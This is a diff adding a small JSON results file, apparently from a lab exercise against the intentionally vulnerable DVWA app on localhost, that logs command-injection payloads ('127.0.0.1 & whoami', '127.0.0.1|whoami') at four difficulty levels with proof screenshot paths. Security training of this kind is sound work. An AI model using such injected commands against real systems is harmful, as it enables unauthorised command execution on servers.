@@ -1,0 +1,33 @@
+{
+  "generated_at": "2026-06-02T10:26:43+08:00",
+  "items": [
+    {
+      "difficulty": "low",
+      "payload": "127.0.0.1 & whoami",
+      "path": "dvwa-results\\command-injection-progression-20260602-102141\\screenshots\\proof\\low-proof.png",
+      "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/#",
+      "timestamp": "2026-06-02T10:26:29+08:00"
+    },
+    {
+      "difficulty": "medium",
+      "payload": "127.0.0.1 & whoami",
+      "path": "dvwa-results\\command-injection-progression-20260602-102141\\screenshots\\proof\\medium-proof.png",
+      "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/#",
+      "timestamp": "2026-06-02T10:26:35+08:00"
+    },
+    {
+      "difficulty": "high",
+      "payload": "127.0.0.1|whoami",
+      "path": "dvwa-results\\command-injection-progression-20260602-102141\\screenshots\\proof\\high-proof.png",
+      "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/#",
+      "timestamp": "2026-06-02T10:26:40+08:00"
+    },
+    {
+      "difficulty": "impossible",
+      "payload": "127.0.0.1|whoami",
+      "path": "dvwa-results\\command-injection-progression-20260602-102141\\screenshots\\proof\\impossible-proof.png",
+      "url": "http://127.0.0.1/dvwa/vulnerabilities/exec/#",
+      "timestamp": "2026-06-02T10:26:43+08:00"
+    }
+  ]
+}
